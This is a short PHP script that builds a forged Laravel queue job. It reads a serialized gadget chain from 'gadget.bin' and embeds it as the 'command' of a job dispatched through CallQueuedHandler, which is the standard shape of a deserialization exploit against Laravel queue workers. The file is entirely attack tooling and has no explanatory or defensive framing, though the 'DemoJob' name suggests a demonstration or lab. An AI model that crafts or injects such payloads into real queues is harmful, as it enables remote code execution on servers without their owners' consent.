<?php
require "vendor/autoload.php";

$command = file_get_contents("gadget.bin");

$payload = json_encode([
    "uuid"          => (string) Illuminate\Support\Str::uuid(),
    "displayName"   => "App\\Jobs\\DemoJob",
    "job"           => "Illuminate\\Queue\\CallQueuedHandler@call",
    "maxTries"      => null,
    "maxExceptions" => null,
    "failOnTimeout" => false,
    "backoff"       => null,
    "timeout"       => null,
    "retryUntil"    => null,
    "createdAt"     => Illuminate\Support\Carbon::now()->getTimestamp(),
    "id"            => Illuminate\Support\Str::random(32),
    "attempts"      => 0,
    "data"          => [
        "commandName" => "App\\Jobs\\DemoJob",
        "command"     => $command,
        "batchId"     => null,
    ],
]);

echo $payload;
